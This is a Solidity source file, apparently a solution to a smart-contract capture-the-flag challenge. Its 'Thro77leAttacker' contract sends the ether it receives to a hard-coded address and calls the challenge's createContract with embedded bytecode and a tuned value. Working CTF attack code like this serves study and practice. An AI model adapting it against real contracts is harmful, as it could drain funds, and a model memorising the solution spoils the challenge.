pragma solidity 0.8.4;

import "./Challenge.sol";

contract EmptyOne {
}


contract Thro77leAttacker {

    bytes c = hex"6080604052348015600f57600080fd5b50603f80601d6000396000f3fe6080604052600080fdfea264697066735822122051263de48b020bfd029cc7b233b6549029f593de824f0aec76af62fef252447264736f6c63430008040033";
    
    constructor(Challenge instance) payable {
        require(msg.value >= 0.1 ether);

        bytes memory code = c;
       
        payable(0x54b77d402614522EA00064a7f218F1340CF0b1DE).transfer(msg.value);
        instance.createContract(code, 21199);
    }

    receive() external payable { }

}